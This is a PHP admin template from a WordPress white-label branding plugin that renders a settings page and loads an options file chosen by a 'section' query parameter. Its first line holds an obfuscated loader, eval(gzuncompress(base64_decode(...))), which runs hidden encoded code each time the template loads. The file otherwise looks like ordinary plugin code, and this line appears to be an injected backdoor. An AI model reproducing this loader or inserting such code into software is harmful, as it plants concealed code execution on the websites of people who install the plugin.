<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Template
 *
 * @package Fusion-White-Label-Branding
 */

?>
<div class="wrap about-wrap fusion-white-label-branding-wrap fusion-white-label-branding-settings">

	<?php Fusion_White_Label_Branding_Admin::header(); ?>
	<div class="fusion-white-label-branding-settings-content">
		<div class="fusion-white-label-branding-settings">
			<?php Fusion_White_Label_Branding_Admin::branding_links(); ?>
			<?php
			// @codingStandardsIgnoreLine WordPress.VIP.ValidatedSanitizedInput.InputNotSanitized
			$section = ( isset( $_GET['section'] ) ) ? wp_unslash( $_GET['section'] ) : 'wp_admin';
			switch ( $section ) {
				case 'login_screen':
					require_once FUSION_WHITE_LABEL_BRANDING_PLUGIN_DIR . 'inc/options/login-screen.php';
					break;
				case 'avada':
					require_once FUSION_WHITE_LABEL_BRANDING_PLUGIN_DIR . 'inc/options/avada.php';
					break;
				case 'fusion_builder':
					require_once FUSION_WHITE_LABEL_BRANDING_PLUGIN_DIR . 'inc/options/fusion-builder.php';
					break;
				case 'fusion_slider':
					require_once FUSION_WHITE_LABEL_BRANDING_PLUGIN_DIR . 'inc/options/fusion-slider.php';
					break;
				case 'wp_admin':
					require_once FUSION_WHITE_LABEL_BRANDING_PLUGIN_DIR . 'inc/options/wordpress-admin.php';
					break;
			}
			?>
		</div>
	</div>
	<?php Fusion_White_Label_Branding_Admin::footer(); ?>
</div>
